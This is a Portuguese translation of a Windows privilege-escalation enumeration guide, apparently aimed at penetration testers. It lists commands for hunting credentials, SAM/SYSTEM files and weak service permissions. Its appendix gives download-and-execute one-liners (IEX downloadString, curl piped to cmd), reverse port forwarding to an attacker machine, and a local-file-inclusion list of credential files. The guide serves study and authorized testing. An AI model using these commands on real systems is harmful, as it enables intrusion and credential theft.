A escalada de privilégios sempre se resume a uma enumeração adequada. Mas para realizar uma enumeração adequada você precisa saber o que verificar e procurar. Isso exige familiaridade com os sistemas que normalmente vem junto com a experiência. À primeira vista, o escalonamento de privilégios pode parecer uma tarefa difícil, mas depois de um tempo você começa a filtrar o que é normal e o que não é. Eventualmente fica mais fácil saber o que procurar em vez de vasculhar tudo na esperança de encontrar aquela agulha no palheiro. Esperamos que este guia forneça uma boa base para você construir e começar.

Este guia é influenciado pelo Basic Linux Privilege Escalation do g0tm1lk , que em algum momento você já deve ter visto e usado. Eu queria tentar espelhar o guia dele, exceto para Windows. Portanto, este guia se concentrará principalmente no aspecto da enumeração.

Nota: não sou um especialista e ainda estou aprendendo sozinho.

Layout do guia
Em cada seção, primeiro forneço os antigos comandos CMD confiáveis ​​e, em seguida, também um equivalente do Powershell para o bem da posteridade. É bom ter as duas ferramentas sob controle e o Powershell é muito mais versátil para scripts do que o CMD tradicional. No entanto, não existe um equivalente do Powershell para tudo (ou o CMD ainda é simplesmente mais fácil/melhor em certas coisas), portanto, algumas seções conterão apenas comandos CMD regulares.

Versão 1.3 - Última atualização em outubro de 2018

Sistema operacional
Qual é o sistema operacional e a arquitetura? Está faltando algum patch?

systeminfo
wmic qfe
Existe algo interessante nas variáveis ​​de ambiente? Um controlador de domínio em LOGONSERVER?

set
Get-ChildItem Env: | ft Key,Value
Existem outras unidades conectadas?

net use
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
Usuários
Quem é você?

whoami
echo %USERNAME%
$env:UserName
Algum privilégio de usuário interessante? Nota: A coluna Estado não significa que o usuário tenha ou não acesso a esse privilégio. Se o privilégio estiver listado, esse usuário o possui.

whoami /priv
Quais usuários estão no sistema? Algum perfil de usuário antigo que não foi limpo?

net users
dir /b /ad "C:\Users\"
dir /b /ad "C:\Documents and Settings\" # Windows XP and below
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Alguém mais está logado?

qwinsta
Quais grupos estão no sistema?

net localgroup
Get-LocalGroup | ft Name
Algum dos usuários está no grupo Administradores?

net localgroup Administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Alguma coisa no registro para logon automático do usuário?

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
Alguma coisa interessante no Credential Manager?

cmdkey /list
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Podemos acessar arquivos SAM e SYSTEM?

%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
Programas, Processos e Serviços
Qual software está instalado?

dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime

Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
Há alguma pasta ou permissão de arquivo fraca?

Permissões completas para todos ou usuários nas pastas do programa?

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 
Modificar permissões para todos ou usuários nas pastas do programa?

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}} 
Você também pode fazer upload do accesschk do Sysinternals para verificar pastas e arquivos graváveis.

accesschk.exe -qwsu "Everyone" *
accesschk.exe -qwsu "Authenticated Users" *
accesschk.exe -qwsu "Users" *
Quais são os processos/serviços em execução no sistema? Existe um serviço interno não exposto? Se sim, podemos abri-lo? Consulte Encaminhamento de porta no Apêndice.

tasklist /svc
tasklist /v
net start
sc query
Get-Processtem a -IncludeUserNameopção de ver o proprietário do processo, porém você precisa ter direitos administrativos para usá-lo.

Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
Get-Service
Este liner retorna o proprietário do processo sem direitos de administrador, se algo estiver em branco no proprietário, provavelmente está sendo executado como SYSTEM, NETWORK SERVICE ou LOCAL SERVICE.

Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
Alguma permissão de serviço fraca? Podemos reconfigurar alguma coisa? Novamente, carregue o accesschk.

accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
Existem caminhos de serviço não citados?

wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
Quais tarefas agendadas existem? Alguma coisa personalizada implementada?

schtasks /query /fo LIST 2>nul | findstr TaskName
dir C:\windows\tasks
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
O que é executado na inicialização?

wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
O AlwaysInstallElevated está habilitado? Eu não encontrei isso, mas não custa verificar.

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
Rede
Quais NICs estão conectadas? Existem várias redes?

ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
Que rotas temos?

route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
Alguma coisa no cache ARP?

arp -a
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
Existem conexões com outros hosts?

netstat -ano
Alguma coisa no arquivo hosts?

C:\WINDOWS\System32\drivers\etc\hosts
O firewall está ativado? Se sim, o que está configurado?

netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule name=all
netsh advfirewall export "firewall.txt"
Alguma outra configuração de interface interessante?

netsh dump
Existe alguma configuração SNMP?

reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
Arquivos interessantes e informações confidenciais
Esta seção pode ser um pouco barulhenta, então você pode querer enviar comandos em arquivos txt para revisar e analisar como desejar.

Alguma senha no registro?

reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s 
Existem arquivos sysprep ou autônomos disponíveis que não foram limpos?

dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
Se o servidor for um servidor web IIS, o que há no inetpub? Algum diretório oculto? arquivos web.config?

dir /a C:\inetpub\
dir /s web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
O que há nos logs do IIS?

C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\W3SVC2\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\FTPSVC1\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\FTPSVC2\u_ex[YYMMDD].log
O XAMPP, Apache ou PHP está instalado? Existe algum arquivo de configuração do XAMPP, Apache ou PHP?

dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue
Algum log da web do Apache?

dir /s access.log error.log
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
Algum arquivo interessante para ver? Possivelmente dentro de diretórios de usuários (Desktop, Documentos, etc.)?

dir /s *pass* == *vnc* == *.config* 2>nul
Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
Arquivos contendo senha dentro deles?

findstr /si password *.xml *.ini *.txt *.config 2>nul
Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
Apêndice
Script de enumeração
Eu criei um script Powershell que praticamente automatiza todos os itens acima. Você pode conferir aqui .

Transferindo arquivos
Em algum momento durante o escalonamento de privilégios, você precisará colocar os arquivos no seu destino. Abaixo estão algumas maneiras fáceis de fazer isso.

Cmdlet do PowerShell (Powershell 3.0 e superior)

Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"
PowerShell One-Liner

(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 
Execução de script de linha única do PowerShell na memória

IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
PowerShell com proxy

$browser = New-Object System.Net.WebClient;
$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
IEX($browser.DownloadString('https://server/script.ps1'));
Script do PowerShell

echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://server/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
		
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
FTP não interativo via arquivo de texto. Útil para quando você tem apenas uma execução limitada de comandos.

echo open 10.10.10.11 21> ftp.txt
echo USER username>> ftp.txt
echo mypassword>> ftp.txt
echo bin>> ftp.txt
echo GET filename>> ftp.txt
echo bye>> ftp.txt
		
ftp -v -n -s:ftp.txt
CertUtil

certutil.exe -urlcache -split -f https://myserver/filename outputfilename
Certutil também pode ser usado para codificação/decodificação base64.

certutil.exe -encode inputFileName encodedOutputFileName
certutil.exe -decode encodedInputFileName decodedOutputFileName
A partir do Windows 10 1803 (atualização de abril de 2018) curlfoi implementado o comando que oferece outra forma de transferir arquivos e até mesmo executá-los na memória. A tubulação diretamente para o cmd executará a maioria das coisas, mas parece que se você tiver algo diferente de comandos regulares em seu script, ou seja, loops, instruções if, etc., ele não os executará corretamente.

curl http://server/file -o file
curl http://server/file.bat | cmd
E com PowerShell

IEX(curl http://server/script.ps1);Invoke-Blah
Encaminhamento de porta
Isto é útil para expor serviços internos que não estão disponíveis fora da máquina, normalmente devido a configurações de firewall.

Carregar plink.exepara o destino.

Inicie o SSH na sua máquina atacante.

Por exemplo, para expor o SMB, na execução de destino:

plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
A partir do Windows 10 1803 (atualização de abril de 2018), o cliente ssh agora está incluído e ativado por padrão! Assim, você pode usar o ssh para fazer o encaminhamento de porta imediatamente.

ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
Lista de inclusão de arquivos locais
Esta não é uma lista exaustiva, os diretórios de instalação podem variar, listei apenas os mais comuns.

C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini 
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml


Referência: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
